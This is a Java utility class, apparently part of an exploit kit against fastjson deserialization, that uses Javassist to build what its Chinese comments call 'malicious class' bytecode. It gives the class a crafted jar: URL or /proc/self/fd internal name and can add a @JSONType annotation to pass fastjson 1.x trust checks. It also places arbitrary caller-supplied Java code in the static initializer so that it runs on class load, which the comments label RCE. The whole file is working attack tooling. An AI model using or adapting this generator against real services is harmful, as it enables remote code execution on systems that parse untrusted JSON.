package utils;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtNewConstructor;
import javassist.bytecode.AnnotationsAttribute;
import javassist.bytecode.ConstPool;
import javassist.bytecode.annotation.Annotation;

/**
 * 共享核心（javassist 版）：生成"恶意类"字节码。
 *
 * 生成结果：
 *   - 类名（this_class）= 任意 internal name（jar:http://... / jar:file:/proc/self/fd/N!/...）
 *   - 可选 @com.alibaba.fastjson.annotation.JSONType 注解（fastjson 1.x 信任路径需要；fastjson2 不需要）
 *   - 默认构造器（实例化需要）
 *   - <clinit> = clinitBody（Java 源码），JVM 首次加载时执行 → RCE
 */
public final class JavassistGen {

    private JavassistGen() {}

    /** 生成恶意类，不带 @JSONType 注解（fastjson2 路径用） */
    public static byte[] generate(String internalName, String clinitBody) throws Exception {
        return generate(internalName, clinitBody, false);
    }

    /**
     * 生成恶意类。
     *
     * @param internalName 类的 internal name（/ 分隔，如 jar:file:/proc/self/fd/36!/E36）
     * @param clinitBody   static{} 的方法体（Java 源码），可任意自定义
     * @param withJsonType 是否加 @com.alibaba.fastjson.annotation.JSONType 注解（fastjson 1.x 需要）
     * @return 类的字节码
     */
    public static byte[] generate(String internalName, String clinitBody, boolean withJsonType) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        // 预导入常用包，用户代码可用简单类名（File/URL/List...）
        pool.importPackage("java.io");
        pool.importPackage("java.net");
        pool.importPackage("java.util");

        // javassist 不接受非法类名 makeClass，先以合法名创建，再改名为目标 internal name
        CtClass cc = pool.makeClass("X");
        cc.setName(internalName);

        if (withJsonType) {
            ConstPool cpool = cc.getClassFile().getConstPool();
            Annotation ann = new Annotation("com.alibaba.fastjson.annotation.JSONType", cpool);
            AnnotationsAttribute attr = new AnnotationsAttribute(cpool, AnnotationsAttribute.visibleTag);
            attr.addAnnotation(ann);
            cc.getClassFile().addAttribute(attr);
        }

        // 默认构造器（反序列化实例化需要）
        cc.addConstructor(CtNewConstructor.defaultConstructor(cc));

        // static 块：写 Java 源码字符串
        cc.makeClassInitializer().setBody(clinitBody);

        byte[] bytes = cc.toBytecode();
        cc.detach();
        return bytes;
    }
}
